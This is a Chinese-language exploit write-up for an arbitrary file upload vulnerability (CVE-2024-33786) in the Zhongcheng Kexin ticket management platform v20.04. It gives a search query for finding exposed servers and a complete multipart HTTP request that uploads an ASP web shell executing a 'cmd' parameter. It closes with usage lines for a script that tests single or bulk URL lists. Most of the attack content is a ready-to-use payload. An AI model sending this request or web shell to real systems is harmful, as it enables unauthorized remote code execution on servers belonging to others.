# 中城科信票务管理平台 任意文件上传

### 1.漏洞描述

基础六管控多协同，智慧票务系统以私有/公有云为基础部署，提供票类策略管控、售票流程管控、门票核验管控、营销渠道管控、数据分析管控、财务核销管控功能，与其它业务系统数据共享，协同作业。中城科信票务管理平台20.04中存在任意文件上传漏洞，攻击者可以通过上传精心设计的文件来执行任意代码。

CVE编号：

CVE-2024-33786

### 2.影响版本

v20.04

### 3.搜索语法

```java
body="SystemManager/SoftwareLicense.htm"
```

### 4.漏洞复现

```java
POST /SystemManager/Introduction.ashx HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
Connection: close
Content-Length: 507
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: multipart/form-data; boundary=--------------------------354575237365372692397370
Accept-Encoding: gzip

----------------------------354575237365372692397370
Content-Disposition: form-data; name="file"; filename="5.txt"
Content-Type: image/jpeg

<%execute(request("cmd"))%>

----------------------------354575237365372692397370
Content-Disposition: form-data; name="fileName"

test_20240504.asp
----------------------------354575237365372692397370
Content-Disposition: form-data; name="Method"

UpdateUploadLinkPic
----------------------------354575237365372692397370
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1720009711960-3489b55b-a34d-44ae-aeba-94fbf753abe6.png)

得到上传文件的路径，拼接路径访问 

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1720009840870-89b8cf75-63c1-4334-bccc-06cd4619c6b5.png)

### 4.py脚本

```plain
python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```